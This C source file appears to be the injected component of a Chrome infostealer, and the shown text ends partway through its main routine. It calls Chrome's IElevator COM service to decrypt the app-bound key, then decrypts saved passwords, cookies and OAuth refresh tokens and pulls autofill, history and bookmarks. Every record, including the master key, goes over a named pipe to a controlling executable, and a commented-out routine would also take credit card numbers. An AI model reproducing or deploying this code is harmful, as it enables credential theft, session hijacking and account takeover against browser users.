#include "Headers.h"
#include "sqlite3.h"


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Global Variables

// https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/elevation_service_idl.idl

static const CLSID  CLSID_Elevator                 = { 0x708860E0, 0xF641, 0x4611, { 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B } };
static const IID    IID_IElevator                  = { 0x463ABECF, 0x410D, 0x407F, { 0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8 } };

static PBYTE        g_pbDecryptedKey               = NULL;
static DWORD        g_cbDecryptedKey               = 0;

HANDLE              g_hPipe                        = INVALID_HANDLE_VALUE;
BOOL                g_bPipeInitialized             = FALSE;
CHAR                g_szProcessName[MAX_PATH]      = { 0 };
DWORD               g_dwProcessId                  = 0;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static VOID ParseBookmarkNode(IN LPCSTR pszJson, IN DWORD cbJson)
{
    LPCSTR  pszCursor   = pszJson;
    LPCSTR  pszJsonEnd  = pszJson + cbJson;
    DWORD   dwCount     = 0x00;

    while (pszCursor && pszCursor < pszJsonEnd)
    {
        LPCSTR  pszTypeKey      = NULL,
                pszTypeValue    = NULL,
                pszTypeEnd      = NULL;
        DWORD   dwType          = 0x00;

        if (!(pszTypeKey = StrStrA(pszCursor, JSON_KEY_TYPE)) || pszTypeKey >= pszJsonEnd)
            break;

        if (!(pszTypeValue = StrChrA(pszTypeKey + JSON_KEY_TYPE_LEN, '"')) || pszTypeValue >= pszJsonEnd)
            break;
        
        pszTypeValue++;

        if (!(pszTypeEnd = StrChrA(pszTypeValue, '"')) || pszTypeEnd >= pszJsonEnd)
            break;

        dwType = (DWORD)(pszTypeEnd - pszTypeValue);

        if (dwType == JSON_VALUE_URL_LEN && StrCmpNIA(pszTypeValue, JSON_VALUE_URL, JSON_VALUE_URL_LEN) == 0)
        {
#define JSON_SEARCH_BACK_LEN 500
            LPCSTR pszSearchStart   = (pszTypeKey > pszJson + JSON_SEARCH_BACK_LEN) ? (pszTypeKey - JSON_SEARCH_BACK_LEN) : pszJson;
#undef JSON_SEARCH_BACK_LEN
            LPCSTR pszNameKey       = NULL;
            LPCSTR pszTemp          = pszSearchStart;
            
            while ((pszTemp = StrStrA(pszTemp, JSON_KEY_NAME)) != NULL && pszTemp < pszTypeKey)
            {
                pszNameKey = pszTemp;
                pszTemp++;
            }

            if (pszNameKey)
            {
                LPCSTR  pszNameValue    = NULL,
                        pszNameEnd      = NULL,
                        pszUrlKey       = NULL,
                        pszUrlValue     = NULL,
                        pszUrlEnd       = NULL;
                DWORD   dwName          = 0x00;

                if ((pszNameValue = StrChrA(pszNameKey + JSON_KEY_NAME_LEN, '"')) && pszNameValue < pszTypeKey)
                {
                    pszNameValue++;
                    
                    if ((pszNameEnd = StrChrA(pszNameValue, '"')) && pszNameEnd < pszTypeKey)
                    {
                        dwName = (DWORD)(pszNameEnd - pszNameValue);

                        if ((pszUrlKey = StrStrA(pszTypeEnd, JSON_KEY_URL)) && pszUrlKey < pszJsonEnd)
                        {
                            if ((pszUrlValue = StrChrA(pszUrlKey + JSON_KEY_URL_LEN, '"')) && pszUrlValue < pszJsonEnd)
                            {
                                pszUrlValue++;
                                
                                if ((pszUrlEnd = StrChrA(pszUrlValue, '"')) && pszUrlEnd < pszJsonEnd)
                                {
                                    DWORD   dwUrl       = (DWORD)(pszUrlEnd - pszUrlValue);
                                    CHAR    cNameSave   = pszNameValue[dwName];
                                    CHAR    cUrlSave    = pszUrlValue[dwUrl];

                                    ((LPSTR)pszNameValue)[dwName]   = '\0';
                                    ((LPSTR)pszUrlValue)[dwUrl]     = '\0';

                                    SendBookmarkRecord(g_hPipe, pszNameValue, pszUrlValue, 0);
                                    dwCount++;

                                    ((LPSTR)pszNameValue)[dwName] = cNameSave;
                                    ((LPSTR)pszUrlValue)[dwUrl] = cUrlSave;
                                }
                            }
                        }
                    }
                }
            }
        }

        pszCursor = pszTypeEnd + 1;
    }
}

static BOOL ExtractBookmarksFromFile()
{
    LPSTR   pszBookmarksPath    = NULL;
    LPSTR   pszFileContent      = NULL;
    DWORD   dwFileSize          = 0;
    BOOL    bResult             = FALSE;

    if (!(pszBookmarksPath = GetLocalAppDataPath(BOOKMARKS_FILE_PATH)))
    {
        DBGA("[!] GetLocalAppDataPath Failed For Bookmarks");
        return FALSE;
    }

    if (!ReadFileFromDiskA(pszBookmarksPath, (PBYTE*)&pszFileContent, &dwFileSize))
    {
        DBGA("[!] ReadFileFromDiskA Failed For Bookmarks");
        goto _END_OF_FUNC;
    }

    ParseBookmarkNode(pszFileContent, dwFileSize);

    bResult = TRUE;

_END_OF_FUNC:
    HEAP_FREE(pszBookmarksPath);
    HEAP_FREE(pszFileContent);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ExtractHistoryFromDatabase()
{
    sqlite3*        pDb                     = NULL;
    sqlite3_stmt*   pStmt                   = NULL;
    INT             nSqliteResult           = SQLITE_OK;
    LPCSTR          szUrl                   = NULL;
    LPCSTR          szTitle                 = NULL;
    LPCSTR          pszHistoryDatabasePath  = NULL;
    DWORD           dwVisitCount            = 0;
    INT64           llLastVisitTime         = 0;
    BOOL            bResult                 = FALSE;


    if (!(pszHistoryDatabasePath = GetLocalAppDataPath(HISTORY_FILE_PATH)))
        return FALSE;

    if ((nSqliteResult = sqlite3_open_v2(pszHistoryDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    // DBGA("[v] Opened Database: %s", pszHistoryDatabasePath);

    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_HISTORY, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    DBGA("[+] Executing Query: %s", SQLQUERY_HISTORY);

    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        szUrl           = (LPCSTR)sqlite3_column_text(pStmt, 0);
        szTitle         = (LPCSTR)sqlite3_column_text(pStmt, 1);
        dwVisitCount    = sqlite3_column_int(pStmt, 2);
        llLastVisitTime = sqlite3_column_int64(pStmt, 3);

        SendHistoryRecord(g_hPipe, szUrl, szTitle, dwVisitCount, llLastVisitTime);
    }

    if (nSqliteResult != SQLITE_DONE)
    {
        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt)
        sqlite3_finalize(pStmt);
    if (pDb)
        sqlite3_close(pDb);
    HEAP_FREE(pszHistoryDatabasePath);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ExtractAutofillFromDatabase()
{
    sqlite3*        pDb                     = NULL;
    sqlite3_stmt*   pStmt                   = NULL;
    INT             nSqliteResult           = SQLITE_OK;
    LPCSTR          szName                  = NULL;
    LPCSTR          szValue                 = NULL;
    LPCSTR          pszWebDatabasePath      = NULL;
    INT64           llDateCreated           = 0;
    DWORD           dwCount                 = 0;
    BOOL            bResult                 = FALSE;


    if (!(pszWebDatabasePath = GetLocalAppDataPath(WEB_DATA_FILE_PATH)))
        return FALSE;

    if ((nSqliteResult = sqlite3_open_v2(pszWebDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    // DBGA("[v] Opened Database: %s", pszWebDatabasePath);

    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_AUTOFILL, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    DBGA("[+] Executing Query: %s", SQLQUERY_AUTOFILL);

    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        szName          = (LPCSTR)sqlite3_column_text(pStmt, 0);
        szValue         = (LPCSTR)sqlite3_column_text(pStmt, 1);
        llDateCreated   = sqlite3_column_int64(pStmt, 2);
        dwCount         = sqlite3_column_int(pStmt, 3);

        SendAutofillRecord(g_hPipe, szName, szValue, llDateCreated, dwCount);
    }

    if (nSqliteResult != SQLITE_DONE)
    {
        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt)
        sqlite3_finalize(pStmt);
    if (pDb)
        sqlite3_close(pDb);
    HEAP_FREE(pszWebDatabasePath);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

/*
static BOOL ExtractCreditCardsFromDatabase()
{
    sqlite3*        pDb                         = NULL;
    sqlite3_stmt*   pStmt                       = NULL;
    INT             nSqliteResult               = SQLITE_OK;
    LPCSTR          szNameOnCard                = NULL;
    LPCSTR          szNickname                  = NULL;
    LPCSTR          pszWebDatabasePath          = NULL;
    DWORD           dwExpirationMonth           = 0;
    DWORD           dwExpirationYear            = 0;
    INT64           llDateModified              = 0;
    PBYTE           pbEncryptedCardNumber       = NULL;
    DWORD           dwEncryptedCardNumberSize   = 0;
    PBYTE           pbDecryptedCardNumber       = NULL;
    DWORD           dwDecryptedCardNumberSize   = 0;
    BOOL            bResult                     = FALSE;


    if (!(pszWebDatabasePath = GetLocalAppDataPath(WEB_DATA_FILE_PATH)))
        return FALSE;

    if ((nSqliteResult = sqlite3_open_v2(pszWebDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    // DBGA("[v] Opened Database: %s", pszWebDatabasePath);

    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_CREDIT_CARDS, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    DBGA("[+] Executing Query: %s", SQLQUERY_CREDIT_CARDS);

    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        szNameOnCard                = (LPCSTR)sqlite3_column_text(pStmt, 0);
        dwExpirationMonth           = sqlite3_column_int(pStmt, 1);
        dwExpirationYear            = sqlite3_column_int(pStmt, 2);
        pbEncryptedCardNumber       = (PBYTE)sqlite3_column_blob(pStmt, 3);
        dwEncryptedCardNumberSize   = sqlite3_column_bytes(pStmt, 3);
        szNickname                  = (LPCSTR)sqlite3_column_text(pStmt, 4);
        llDateModified              = sqlite3_column_int64(pStmt, 5);

        pbDecryptedCardNumber       = NULL;
        dwDecryptedCardNumberSize   = 0;

        if (g_pbDecryptedKey && pbEncryptedCardNumber && dwEncryptedCardNumberSize > 0)
        {
            if (DecryptChromeV20Secret(g_pbDecryptedKey, g_cbDecryptedKey, pbEncryptedCardNumber, dwEncryptedCardNumberSize, &pbDecryptedCardNumber, &dwDecryptedCardNumberSize))
            {
                SendCreditCardRecord(g_hPipe, szNameOnCard, szNickname, dwExpirationMonth, dwExpirationYear, llDateModified, pbDecryptedCardNumber, dwDecryptedCardNumberSize);
                HEAP_FREE(pbDecryptedCardNumber);
            }
            else
            {
                DBGA("[!] DecryptChromeV20Secret Failed For Credit Card");
            }
        }
    }

    if (nSqliteResult != SQLITE_DONE)
    {
        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt)
        sqlite3_finalize(pStmt);
    if (pDb)
        sqlite3_close(pDb);
    HEAP_FREE(pszWebDatabasePath);
    return bResult;
}
*/

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ExtractLoginsFromDatabase()
{
    sqlite3*        pDb                         = NULL;
    sqlite3_stmt*   pStmt                       = NULL;
    INT             nSqliteResult               = SQLITE_OK;
    LPCSTR          szOriginUrl                 = NULL;
    LPCSTR          szActionUrl                 = NULL;
    LPCSTR          szUsername                  = NULL;
    LPCSTR          pszLoginDatabasePath        = NULL;
    PBYTE           pbEncryptedPassword         = NULL;
    DWORD           dwEncryptedPasswordSize     = 0;
    PBYTE           pbDecryptedPassword         = NULL;
    DWORD           dwDecryptedPasswordSize     = 0;
    INT64           llDateCreated               = 0;
    INT64           llDateLastUsed              = 0;
    BOOL            bResult                     = FALSE;


    if (!(pszLoginDatabasePath = GetLocalAppDataPath(LOGIN_DATA_FILE_PATH)))
        return FALSE;

    if ((nSqliteResult = sqlite3_open_v2(pszLoginDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    // DBGA("[v] Opened Database: %s", pszLoginDatabasePath);

    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_LOGINS, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    DBGA("[+] Executing Query: %s", SQLQUERY_LOGINS);

    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        szOriginUrl             = (LPCSTR)sqlite3_column_text(pStmt, 0);
        szActionUrl             = (LPCSTR)sqlite3_column_text(pStmt, 1);
        szUsername              = (LPCSTR)sqlite3_column_text(pStmt, 2);
        pbEncryptedPassword     = (PBYTE)sqlite3_column_blob(pStmt, 3);
        dwEncryptedPasswordSize = sqlite3_column_bytes(pStmt, 3);
        llDateCreated           = sqlite3_column_int64(pStmt, 4);
        llDateLastUsed          = sqlite3_column_int64(pStmt, 5);

        pbDecryptedPassword     = NULL;
        dwDecryptedPasswordSize = 0;

        if (g_pbDecryptedKey && pbEncryptedPassword && dwEncryptedPasswordSize > 0)
        {
            if (DecryptChromeV20Secret(g_pbDecryptedKey, g_cbDecryptedKey, pbEncryptedPassword, dwEncryptedPasswordSize, &pbDecryptedPassword, &dwDecryptedPasswordSize))
            {
                SendLoginRecord(g_hPipe, szOriginUrl, szActionUrl, szUsername, pbDecryptedPassword, dwDecryptedPasswordSize, llDateCreated, llDateLastUsed);
                HEAP_FREE(pbDecryptedPassword);
            }
            else
            {
                DBGA("[!] DecryptChromeV20Secret Failed For Login");
            }
        }
    }

    if (nSqliteResult != SQLITE_DONE)
    {
        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt)
        sqlite3_finalize(pStmt);
    if (pDb)
        sqlite3_close(pDb);
    HEAP_FREE(pszLoginDatabasePath);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ExtractCookiesFromDatabase()
{
    sqlite3*        pDb                     = NULL;
    sqlite3_stmt*   pStmt                   = NULL;
    INT             nSqliteResult           = SQLITE_OK;
    LPCSTR          szHostKey               = NULL;
    LPCSTR          szPath                  = NULL;
    LPCSTR          szName                  = NULL;
    LPCSTR          pszCookiesDatabasePath  = NULL;
    INT64           llExpiresUtc            = 0x00;
    PBYTE           pbEncryptedValue        = NULL;
    DWORD           dwEncryptedValueSize    = 0x00;
    PBYTE           pbDecryptedValue        = NULL;
    DWORD           dwDecryptedValueSize    = 0x00;
    BOOL            bResult                 = FALSE;

    if (!(pszCookiesDatabasePath = GetLocalAppDataPath(COOKIES_FILE_PATH)))
        return FALSE;

    if ((nSqliteResult = sqlite3_open_v2(pszCookiesDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    // DBGA("[v] Opened Database: %s", pszCookiesDatabasePath);

    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_COOKIES, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    DBGA("[+] Executing Query: %s", SQLQUERY_COOKIES);

    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        szHostKey               = (LPCSTR)sqlite3_column_text(pStmt, 0);
        szPath                  = (LPCSTR)sqlite3_column_text(pStmt, 1);
        szName                  = (LPCSTR)sqlite3_column_text(pStmt, 2);
        llExpiresUtc            = sqlite3_column_int64(pStmt, 3);
        pbEncryptedValue        = (PBYTE)sqlite3_column_blob(pStmt, 4);
        dwEncryptedValueSize    = sqlite3_column_bytes(pStmt, 4);

        pbDecryptedValue        = NULL;
        dwDecryptedValueSize    = 0;

        if (g_pbDecryptedKey && pbEncryptedValue && dwEncryptedValueSize > 0)
        {
            if (DecryptChromeV20Secret(g_pbDecryptedKey, g_cbDecryptedKey, pbEncryptedValue, dwEncryptedValueSize, &pbDecryptedValue, &dwDecryptedValueSize))
            {
                // The value of the cookie starts after the first 32 bytes (Thanks to luci4_vx::https://luci4.net) 
                if (dwDecryptedValueSize > BUFFER_SIZE_32)
                    SendCookieRecord(g_hPipe, szHostKey, szPath, szName, llExpiresUtc, pbDecryptedValue + BUFFER_SIZE_32, dwDecryptedValueSize - BUFFER_SIZE_32);
                else
                    SendCookieRecord(g_hPipe, szHostKey, szPath, szName, llExpiresUtc, pbDecryptedValue, dwDecryptedValueSize);

                HEAP_FREE(pbDecryptedValue);
            }
            else
            {
                DBGA("[!] DecryptChromeV20Secret Failed For Cookie: %s", szName);
            }
        }
    }

    if (nSqliteResult != SQLITE_DONE)
    {
        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt)
        sqlite3_finalize(pStmt);
    if (pDb)
        sqlite3_close(pDb);
    HEAP_FREE(pszCookiesDatabasePath);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ExtractRefreshTokenFromDatabase()
{
    sqlite3*        pDb                     = NULL;
    sqlite3_stmt*   pStmt                   = NULL;
    INT             nSqliteResult           = SQLITE_OK;
    LPCSTR          szService               = NULL;
    LPCSTR          pszWebDatabasePath      = NULL;
    PBYTE           pbEncryptedToken        = NULL;
    DWORD           dwEncryptedTokenSize    = 0x00;
    PBYTE           pbDecryptedToken        = NULL;
    DWORD           dwDecryptedTokenSize    = 0x00;
    PBYTE           pbBindingKey            = NULL;
    DWORD           dwBindingKeySize        = 0x00;
    BOOL            bResult                 = FALSE;


    if (!(pszWebDatabasePath = GetLocalAppDataPath(WEB_DATA_FILE_PATH)))
        return FALSE;

    if ((nSqliteResult = sqlite3_open_v2(pszWebDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    // DBGA("[v] Opened Database: %s", pszWebDatabasePath);

    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_TOKEN_SERVICE, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    DBGA("[+] Executing Query: %s", SQLQUERY_TOKEN_SERVICE);

    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        szService               = (LPCSTR)sqlite3_column_text(pStmt, 0);
        pbEncryptedToken        = (PBYTE)sqlite3_column_blob(pStmt, 1);
        dwEncryptedTokenSize    = sqlite3_column_bytes(pStmt, 1);
        pbBindingKey            = (PBYTE)sqlite3_column_blob(pStmt, 2);
        dwBindingKeySize        = sqlite3_column_bytes(pStmt, 2);

        pbDecryptedToken        = NULL;
        dwDecryptedTokenSize    = 0;

        if (g_pbDecryptedKey && pbEncryptedToken && dwEncryptedTokenSize > 0)
        {
            if (DecryptChromeV20Secret(g_pbDecryptedKey, g_cbDecryptedKey, pbEncryptedToken, dwEncryptedTokenSize, &pbDecryptedToken, &dwDecryptedTokenSize))
            {
                SendTokenRecord(g_hPipe, szService, pbDecryptedToken, dwDecryptedTokenSize, pbBindingKey, dwBindingKeySize);
                HEAP_FREE(pbDecryptedToken);
            }
            else
            {
                DBGA("[!] DecryptChromeV20Secret Failed For Token: %s", szService);
            }
        }
    }

    if (nSqliteResult != SQLITE_DONE)
    {
        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt)
        sqlite3_finalize(pStmt);
    if (pDb)
        sqlite3_close(pDb);
    HEAP_FREE(pszWebDatabasePath);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ExtractAppBoundEncryptedKeyFromFile(OUT PBYTE* ppbEncryptedKey, OUT PDWORD pdwEncryptedKeySize)
{
    LPSTR   pszLocalStatePath   = NULL;
    LPSTR   pszFileContent      = NULL;
    LPSTR   pszBase64Key        = NULL;
    PBYTE   pbDecodedKey        = NULL;
    DWORD   dwFileSize          = 0x00,
            dwBase64KeyLen      = 0x00,
            dwDecodedKeyLen     = 0x00;
    BOOL    bResult             = FALSE;

    if (!ppbEncryptedKey || !pdwEncryptedKeySize)
        return FALSE;

    *ppbEncryptedKey        = NULL;
    *pdwEncryptedKeySize    = 0x00;
    
    if (!(pszLocalStatePath = GetLocalAppDataPath(LOCAL_STATE_FILE_PATH)))
        return FALSE;

    if (!ReadFileFromDiskA(pszLocalStatePath, (PBYTE*)&pszFileContent, &dwFileSize))
        goto _END_OF_FUNC;

    pszBase64Key = FindNestedJsonValue(pszFileContent, dwFileSize, JSON_PARENT_KEY, JSON_CHILD_KEY, &dwBase64KeyLen);
    if (!pszBase64Key || dwBase64KeyLen == 0)
    {
        DBGA("[!] FindNestedJsonValue Failed To Get %s:%s", JSON_PARENT_KEY, JSON_CHILD_KEY);
        goto _END_OF_FUNC;
    }

    DBGA("[i] Found %s::%s:%s", pszLocalStatePath, JSON_PARENT_KEY, JSON_CHILD_KEY);

    if (!(pbDecodedKey = Base64Decode(pszBase64Key, dwBase64KeyLen, &dwDecodedKeyLen)))
        goto _END_OF_FUNC;

    if (dwDecodedKeyLen <= CRYPT_APPBOUND_KEY_PREFIX_LEN || *(PDWORD)pbDecodedKey != CRYPT_APPBOUND_KEY_PREFIX)
    {
        DBGA("[!] Decoded Key Is Invlaid!");
        goto _END_OF_FUNC;
    }

    *pdwEncryptedKeySize = dwDecodedKeyLen - CRYPT_APPBOUND_KEY_PREFIX_LEN;

    if (!(*ppbEncryptedKey = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *pdwEncryptedKeySize)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        *pdwEncryptedKeySize = 0x00;
        goto _END_OF_FUNC;
    }

    RtlCopyMemory(*ppbEncryptedKey, pbDecodedKey + CRYPT_APPBOUND_KEY_PREFIX_LEN, *pdwEncryptedKeySize);
    
    bResult = TRUE;

_END_OF_FUNC:
    HEAP_FREE(pbDecodedKey);
    HEAP_FREE(pszFileContent);
    HEAP_FREE(pszLocalStatePath);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL GetPlainAppBoundKey()
{
    IElevator*  pElevator           = NULL;
    PBYTE       pbEncryptedKey      = NULL;
    DWORD       dwEncryptedKeySize  = 0x00,
                dwLastError         = ERROR_GEN_FAILURE;
    BSTR        bstrCiphertext      = NULL,
                bstrPlaintext       = NULL;
    LPSTR       pszHexKey           = NULL;
    HRESULT     hResult             = S_OK;
    BOOL        bResult             = FALSE;

    if (FAILED((hResult = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))))
    {
        DBGA("[!] CoInitializeEx Failed With Error: 0x%08X", hResult);
        return FALSE;
    }

    if (FAILED((hResult = CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (LPVOID*)&pElevator))))
    {
        DBGA("[!] CoCreateInstance Failed With Error: 0x%08X", hResult);
        goto _END_OF_FUNC;
    }

    hResult = CoSetProxyBlanket(
        (IUnknown*)pElevator,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_DYNAMIC_CLOAKING
    );

    if (FAILED(hResult))
    {
        DBGA("[!] CoSetProxyBlanket Failed With Error: 0x%08X", hResult);
        goto _END_OF_FUNC;
    }

    if (!ExtractAppBoundEncryptedKeyFromFile(&pbEncryptedKey, &dwEncryptedKeySize))
        goto _END_OF_FUNC;

    if (!(bstrCiphertext = SysAllocStringByteLen((LPCSTR)pbEncryptedKey, dwEncryptedKeySize)))
        goto _END_OF_FUNC;

    if (FAILED((hResult = pElevator->lpVtbl->DecryptData(pElevator, bstrCiphertext, &bstrPlaintext, &dwLastError))))
    {
        DBGA("[!] DecryptData Failed With Error: 0x%08X (LastError: %lu)", hResult, dwLastError);
        goto _END_OF_FUNC;
    }

    DBGA("[*] IElevatorVtbl::DecryptData Succeeded!");

    g_cbDecryptedKey = BUFFER_SIZE_32;

    if (!(g_pbDecryptedKey = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_cbDecryptedKey)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    RtlCopyMemory(g_pbDecryptedKey, (PVOID)bstrPlaintext, g_cbDecryptedKey);

    if ((pszHexKey = BytesToHexString(g_pbDecryptedKey, g_cbDecryptedKey)))
        DBGA("[*] Decrypted Key: %s", pszHexKey);

    if (!SendAppBoundKeyRecord(g_hPipe, g_pbDecryptedKey, g_cbDecryptedKey))
    {
        DBGA("[!] SendAppBoundKeyRecord Failed To Send The Key");
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:

    HEAP_FREE(pszHexKey);
    HEAP_FREE(pbEncryptedKey);

    if (bstrPlaintext)
        SysFreeString(bstrPlaintext);
    if (bstrCiphertext)
        SysFreeString(bstrCiphertext);
    
    if (pElevator)
        pElevator->lpVtbl->Release(pElevator);

    CoUninitialize();

    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static DWORD WINAPI ExtractChromeData(LPVOID lpParam)
{
    DBGA("[+] Starting Chrome Data Extraction...");

    if (!GetPlainAppBoundKey())
    {
        DBGA("[!] GetPlainAppBoundKey Failed, Cannot Decrypt Chrome Secrets");
        goto _END_OF_FUNC;
    }

    DBGA("[*] Key Sent To Executable Successfully");

    // Extract encrypted data 
    DBGA("[i] Extracting Cookies...");
    ExtractCookiesFromDatabase();

    DBGA("[i] Extracting Logins...");
    ExtractLoginsFromDatabase();

    /*
    DBGA("[i] Extracting Credit Cards...");
    ExtractCreditCardsFromDatabase();
    */

    DBGA("[i] Extracting Refresh Tokens...");
    ExtractRefreshTokenFromDatabase();

    // Extract non-encrypted data
    DBGA("[i] Extracting Autofill...");
    ExtractAutofillFromDatabase();

    DBGA("[i] Extracting History...");
    ExtractHistoryFromDatabase();

    DBGA("[i] Extracting Bookmarks...");
